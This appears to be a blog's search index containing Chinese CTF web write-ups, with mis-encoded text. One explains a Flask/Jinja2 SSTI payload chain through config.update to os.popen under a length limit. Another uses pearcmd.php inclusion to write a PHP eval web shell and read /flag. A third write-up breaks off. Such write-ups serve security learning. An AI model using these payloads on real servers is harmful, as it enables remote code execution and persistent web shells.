<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Flask-SSTIé™åˆ¶é•¿åº¦ç»•è¿‡</title>
    <link href="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/"/>
    <url>/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="åˆ©ç”¨configç»•è¿‡payloadé•¿åº¦é™åˆ¶"><a href="#åˆ©ç”¨configç»•è¿‡payloadé•¿åº¦é™åˆ¶" class="headerlink" title="åˆ©ç”¨configç»•è¿‡payloadé•¿åº¦é™åˆ¶"></a>åˆ©ç”¨configç»•è¿‡payloadé•¿åº¦é™åˆ¶</h2><p>Flask æ¡†æ¶ä¸­å­˜åœ¨**<code>config</code>å…¨å±€å¯¹è±¡**ï¼Œç”¨æ¥ä¿å­˜é…ç½®ä¿¡æ¯</p><p><code>config</code> å¯¹è±¡å®è´¨ä¸Šæ˜¯ä¸€ä¸ª<strong>å­—å…¸çš„å­ç±»</strong>ï¼Œå¯ä»¥åƒå­—å…¸ä¸€æ ·æ“ä½œ</p><p>å› æ­¤è¦æ›´æ–°å­—å…¸ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Python ä¸­çš„ <strong>update() æ–¹æ³•</strong></p><p>ç”¨ <strong>update() æ–¹æ³•</strong> + <strong>å…³é”®å­—å‚æ•°</strong>æ›´æ–°å­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">d = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span>&#125;<br><span class="hljs-built_in">print</span>(d)<br>d.update(d=<span class="hljs-number">4</span>)<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250403195827193.png" alt="image-20250403195827193"></p><p>Jinja æ¨¡æ¿ä¸­å­˜åœ¨ <strong>set è¯­å¥</strong>ï¼Œç”¨æ¥è®¾ç½®æ¨¡æ¿ä¸­çš„å˜é‡ï¼Œå¯ä»¥åœ¨æ¨¡æ¿ä¸­åˆ›å»ºæ–°çš„å˜é‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> var=<span class="hljs-string">&#x27;test&#x27;</span> %&#125;<br><br><span class="hljs-comment"># &#123;&#123;var&#125;&#125; æ˜¯ Jinja2 æ¨¡æ¿å¼•æ“é‡Œç”¨äºè¾“å‡ºå˜é‡å€¼çš„è¯­æ³•</span><br>&#123;% <span class="hljs-built_in">set</span> var=<span class="hljs-string">&#x27;test&#x27;</span> %&#125;&#123;&#123;var&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250403200102000.png" alt="image-20250403200102000"></p><p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Jinja æ¨¡æ¿çš„ <strong>set è¯­å¥</strong>é…åˆå­—å…¸çš„ <strong>update() æ–¹æ³•</strong>æ¥æ›´æ–° <strong>config å…¨å±€å¯¹è±¡</strong></p><p>ä¸‹é¢æ˜¯åˆ©ç”¨<code>&#123;% set ... %&#125;</code>è¯­å¥æ–°å®šä¹‰ä¸€ä¸ªå˜é‡<code>x</code>ï¼Œå…¶å€¼ä¸º <code>config.update(s=&#39;string&#39;)</code> çš„è¿”å›å€¼ï¼Œ<code>config.update(s=&#39;string&#39;)</code> ä¼šå°è¯•å°†é”® <code>&#39;s&#39;</code> å’Œå€¼ <code>&#39;string&#39;</code> æ·»åŠ åˆ° <code>config</code> å­—å…¸ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> x=config.update(s=<span class="hljs-string">&#x27;string&#x27;</span>) %&#125;<br><br><span class="hljs-comment"># &#123;&#123;config&#125;&#125;è¾“å‡ºç¯å¢ƒé…ç½®ä¸­çš„å†…å®¹</span><br>&#123;% <span class="hljs-built_in">set</span> x=config.update(s=<span class="hljs-string">&#x27;string&#x27;</span>) %&#125;&#123;&#123;config&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹å›¾æ˜¯åŸæœ¬çš„<code>config</code></p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250403200933459.png" alt="image-20250403200933459"></p><p>ä¸‹å›¾æ˜¯ç»è¿‡ä¿®æ”¹çš„</p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250403200332645.png" alt="image-20250403200332645"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æœ€åå¤šå‡ºäº†<code>&#39;s&#39;:&#39;string&#39;</code>ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ–°æ·»åŠ çš„</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•åœ¨ <code>config</code> å…¨å±€å¯¹è±¡ä¸­æ›´æ–°å€¼</p><h1 id="åšé¢˜å®æ“"><a href="#åšé¢˜å®æ“" class="headerlink" title="åšé¢˜å®æ“"></a>åšé¢˜å®æ“</h1><blockquote><p>é¢˜ç›®æ¥æºï¼šctfshowâ€“ezzz_ssti</p><p>ç½‘å€ï¼š<a href="https://ctf.show/challenges#ezzz_ssti-4495">https://ctf.show/challenges#ezzz_ssti-4495</a></p></blockquote><p>æ ¹æ®é¢˜ç›®å¯çŸ¥æ˜¯SSTIï¼Œæ³¨å…¥ç‚¹å°±æ˜¯ç™»å½•çš„åœ°æ–¹</p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606144124022.png" alt="image-20250606144124022"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">6</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606144155093.png" alt="image-20250606144155093"></p><p>bpæŠ“åŒ…fuzzï¼Œçœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ</p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606144336586.png" alt="image-20250606144336586"></p><p>å‘ç°ä¼¼ä¹æ²¡ä»€ä¹ˆè¿‡æ»¤çš„ï¼Œç›´æ¥æ‰“SSTIï¼Œä½†æ˜¯å‘ç°å­˜åœ¨é•¿åº¦é™åˆ¶</p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606144454654.png" alt="image-20250606144454654"></p><p>ç»è¿‡æµ‹è¯•åå‘ç°é™åˆ¶payloadé•¿åº¦ä¸èƒ½è¶…è¿‡40ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>config</code>è¿›è¡Œç»•è¿‡</p><p><strong>æ€è·¯å°±æ˜¯åˆ©ç”¨<code>set</code>å’Œ<code>update</code>å°†æƒ³è¦çš„æ¨¡å—æˆ–å‡½æ•°å†™å…¥åˆ°å…¨å±€å˜é‡ä¸­ï¼Œä¾æ¬¡è·å–åˆ°<code>lipsum</code>å‡½æ•°çš„å…¨å±€å‘½åç©ºé—´<code>__globals__</code>ï¼ˆåŒ…å«æ‰€æœ‰å†…ç½®å‡½æ•°å’Œå˜é‡ï¼‰ï¼Œç„¶åä»å…¨å±€å‘½åç©ºé—´ä¸­è·å–åˆ°<code>os</code>æ¨¡å—ï¼Œæœ€åå°±æ˜¯è·å–åˆ°<code>os</code>æ¨¡å—ä¸­çš„<code>popen</code>å‡½æ•°ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</strong></p><p>ä»¥ä¸‹æ˜¯åŸæœ¬çš„<code>config</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606145514373.png" alt="image-20250606145514373"></p><p>åˆ©ç”¨<code>set</code>å’Œ<code>update</code>åœ¨<code>config</code>å…¨å±€å˜é‡ä¸­æ–°åˆ›å»ºä¸€ä¸ª<code>a</code>å˜é‡ï¼Œå¹¶èµ‹å…¶é”®å€¼ä¸º<code>update</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606145914775.png" alt="image-20250606145914775"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606145939602.png" alt="image-20250606145939602"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå°†é”®å€¼ä¸º<code>update</code>çš„å˜é‡<code>a</code>å†™å…¥å…¨å±€å˜é‡ä¸­ï¼Œä¹‹åå¯ä»¥ç›´æ¥ä½¿ç”¨å˜é‡<code>a</code>æ¥ä»£æ›¿<code>update</code>ï¼Œå¯ä»¥åœ¨ä¹‹åä½¿ç”¨æ›´çŸ­çš„payload</p><p>ç„¶åå°±æ˜¯åˆ©ç”¨ç›¸åŒçš„æ–¹æ³•ï¼Œå°†<code>__globals__</code>ã€<code>os</code>ã€<code>popen</code>å†™å…¥åˆ°å…¨å±€å˜é‡ä¸­</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(g=lipsum.__globals__)%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150326227.png" alt="image-20250606150326227"></p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150343479.png" alt="image-20250606150343479"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&#123;%set%<span class="hljs-number">20</span>x=config.<span class="hljs-built_in">a</span>(o=config.g.os)%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150402093.png" alt="image-20250606150402093"></p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150444078.png" alt="image-20250606150444078"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(p=config.o.popen)%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150541558.png" alt="image-20250606150541558"></p><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150522392.png" alt="image-20250606150522392"></p><p>æœ€åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨å…¨å±€å˜é‡ä¸­çš„<code>popen</code>å‡½æ•°æ‰§è¡Œå‘½ä»¤</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.p</span>(<span class="hljs-name">&quot;ls /&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150640597.png" alt="image-20250606150640597"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.p</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/06/Flask-SSTI%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/image-20250606150703295.png" alt="image-20250606150703295"></p><h1 id="å®Œæ•´payload"><a href="#å®Œæ•´payload" class="headerlink" title="å®Œæ•´payload"></a>å®Œæ•´payload</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br><br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(g=lipsum.__globals__)%&#125;<br><br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(o=config.g.os)%&#125;<br><br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(p=config.o.popen)%&#125;<br><br>&#123;&#123;config.p(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI é•¿åº¦é™åˆ¶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pearcmd.phpæ–‡ä»¶åŒ…å«</title>
    <link href="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰ç½®ä¸payload"><a href="#å‰ç½®ä¸payload" class="headerlink" title="å‰ç½®ä¸payload"></a>å‰ç½®ä¸payload</h1><p>åˆ©ç”¨<code>pearcmd.php</code>æ–‡ä»¶åŒ…å«çš„å‰ææ˜¯<code>register_argc_argv</code>è¿™ä¸ªè¦æ‰“å¼€</p><p><code>pearcmd.php</code>æ–‡ä»¶çš„ä½ç½®åœ¨ <code>/usr/share/php/pearcmd.php</code> æˆ– <code>/usr/local/lib/php/pearcmd</code></p><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604140407295.png" alt="image-20250604140407295"></p><p>ä¸¤ç§æ–‡ä»¶ä½ç½®çš„payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?+</span>config-create+<span class="hljs-regexp">/&amp;file=/usr</span><span class="hljs-regexp">/share/php</span><span class="hljs-regexp">/pearcmd.php&amp;/</span>&lt;<span class="hljs-string">?=</span>eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">?&gt;</span>+<span class="hljs-regexp">/var/www</span><span class="hljs-regexp">/html/shell</span>.php <br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?+</span>config-create+<span class="hljs-regexp">/&amp;file=/usr</span><span class="hljs-regexp">/local/lib</span><span class="hljs-regexp">/php/pearcmd</span>&amp;<span class="hljs-regexp">/&lt;?=eval($_POST[1]);?&gt;+/var</span><span class="hljs-regexp">/www/html</span><span class="hljs-regexp">/shell.php</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>?+config-create+/</code> ï¼š</strong> è§¦å‘ <code>pearcmd.php</code> ä¸­çš„é…ç½®åˆ›å»ºåŠŸèƒ½</li><li><strong><code>&amp;file=/usr/local/lib/php/pearcmd</code> ï¼š</strong> æŒ‡å®šè¦åŒ…å«çš„æ–‡ä»¶è·¯å¾„</li><li><strong><code>&amp;/</code> ï¼š</strong> ç»ˆæ­¢å‚æ•°è§£æçš„ç‰¹æ®Šç¬¦å·ï¼Œè¿«ä½¿è„šæœ¬åœæ­¢å¤„ç†åç»­å‚æ•°ï¼Œç¡®ä¿å‰é¢çš„å‚æ•°è¢«æ­£ç¡®è§£æ</li></ul><p>è¿™å°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬<code>&lt;?=eval($_POST[1])?&gt;</code>å†™å…¥äº†<code>/var/www/html/shell.php</code> </p><p>**æ³¨æ„ï¼š**è¦åˆ©ç”¨bpæŠ“åŒ…è¿›è¡Œä¼ å…¥ï¼Œå› ä¸ºå¦‚æœç›´æ¥åœ¨æµè§ˆå™¨ä¸­ä¼ å‚ï¼Œphpä»£ç ä¸­çš„éƒ¨åˆ†ç¬¦å·ä¼šè¢«urlç¼–ç ä¹‹åå†å†™å…¥<code>shell.php</code>æ–‡ä»¶ä¸­ï¼Œå°±ä¸ä¼šè¢«å½“æˆphpä»£ç </p><h1 id="é¢˜ç›®å®æ“"><a href="#é¢˜ç›®å®æ“" class="headerlink" title="é¢˜ç›®å®æ“"></a>é¢˜ç›®å®æ“</h1><blockquote><p><strong>é¢˜ç›®æ¥æºï¼š</strong>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</p><p><strong>é¢˜ç›®ç½‘å€ï¼š</strong> <a href="https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]Include%20%F0%9F%8D%90">https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]Include%20%F0%9F%8D%90</a></p></blockquote><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æç¤º<code>phpinfo.php</code>ä¸­æœ‰ä¸œè¥¿ï¼Œè¿›è¡ŒåŒ…å«çœ‹çœ‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=phpinfo<br></code></pre></td></tr></table></figure><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604134228261.png" alt="image-20250604134228261"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">fake</span><span class="hljs-template-variable">&#123;Check_register_argc_argv&#125;</span><br></code></pre></td></tr></table></figure><p>æ˜¯ä¸ªå‡çš„flagï¼Œä¸è¿‡ä¹Ÿæ˜¯ä¸ªæç¤ºï¼Œæ£€æŸ¥<code>register_argc_argv</code></p><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604134326879.png" alt="image-20250604134326879"></p><p>ä¼šå‘ç°<code>register_argc_argv</code>æ˜¯å¼€ç€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥å¯¹<code>pearcmd.php</code>æ–‡ä»¶è¿›è¡ŒåŒ…å«åˆ©ç”¨</p><p>è¿™é‡Œä½¿ç”¨çš„åœ¨<code>/usr/local/lib/php/pearcmd</code></p><p>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?+</span>config-create+<span class="hljs-regexp">/&amp;file=/usr</span><span class="hljs-regexp">/local/lib</span><span class="hljs-regexp">/php/pearcmd</span>&amp;<span class="hljs-regexp">/&lt;?=eval($_POST[1]);?&gt;+/var</span><span class="hljs-regexp">/www/html</span><span class="hljs-regexp">/shell.php</span><br></code></pre></td></tr></table></figure><p>**æ³¨æ„ï¼š**è¦åˆ©ç”¨bpæŠ“åŒ…è¿›è¡Œä¼ å…¥ï¼Œå› ä¸ºå¦‚æœç›´æ¥åœ¨æµè§ˆå™¨ä¸­ä¼ å‚ï¼Œphpä»£ç ä¸­çš„éƒ¨åˆ†ç¬¦å·ä¼šè¢«urlç¼–ç ä¹‹åå†å†™å…¥<code>shell.php</code>æ–‡ä»¶ä¸­ï¼Œå°±ä¸ä¼šè¢«å½“æˆphpä»£ç </p><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604135514809.png" alt="image-20250604135514809"></p><p>ç„¶åç›´æ¥æµè§ˆå™¨è®¿é—®<code>/shell.php</code>è¿›è¡ŒRCEï¼ŒPOSTä¼ å‚1</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&#x27;ls /&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604135849939.png" alt="image-20250604135849939"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604135933743.png" alt="image-20250604135933743"></p><p>ä¹Ÿå¯ä»¥ç”¨èšå‰‘è¿</p><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604135725046.png" alt="image-20250604135725046"></p><p><img src="/2025/06/04/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250604140848501.png" alt="image-20250604140848501"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>æ–‡ä»¶åŒ…å«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å« pearcmd.phpæ–‡ä»¶åŒ…å«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LitCTF-2025-web</title>
    <link href="/2025/05/30/LitCTF-2025-web/"/>
    <url>/2025/05/30/LitCTF-2025-web/</url>
    
    <content type="html"><![CDATA[<h1 id="LitCTF-2025-æ˜Ÿæ„¿ä¿¡ç®±"><a href="#LitCTF-2025-æ˜Ÿæ„¿ä¿¡ç®±" class="headerlink" title="[LitCTF 2025]æ˜Ÿæ„¿ä¿¡ç®±"></a>[LitCTF 2025]æ˜Ÿæ„¿ä¿¡ç®±</h1><p>çŒœæµ‹æ˜¯SSTIï¼Œæµ‹è¯•éœ€è¦è¾“å…¥æ–‡å­—</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">6</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526182801341.png" alt="image-20250526182801341"></p><p>åŠ ä¸Šä¸ªæ–‡å­—ï¼Œå­˜åœ¨<code>waf</code>ï¼Œè¿‡æ»¤äº†<code>&#123;&#123;&#125;&#125;</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">æˆ‘</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">6</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526182911408.png" alt="image-20250526182911408"></p><p>ä½¿ç”¨<code>&#123;%%&#125;</code>æ›¿ä»£</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æˆ‘ &#123;% <span class="hljs-built_in">print</span>(6<span class="hljs-number">*6</span>) %&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526183052463.png" alt="image-20250526183052463"></p><p>è¿™é‡Œå‘ç°ä¼¼ä¹ä¸éœ€è¦è¾“å…¥æ–‡å­—ä¹Ÿå¯ä»¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;% <span class="hljs-built_in">print</span>(6<span class="hljs-number">*6</span>) %&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526184358807.png" alt="image-20250526184358807"></p><p>ç¡®å®æ˜¯SSTIï¼Œæµ‹è¯•åå‘ç°è¿‡æ»¤äº†<code>cat</code>å’Œ<code>flag</code>ï¼Œå¯ä»¥è¿›è¡Œç¼–ç ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨<code>nl /*</code>æ›¿ä»£ï¼Œå…¶ä»–çš„ä¼¼ä¹æ²¡å•¥è¿‡æ»¤äº†ï¼Œæ‰“SSTI</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 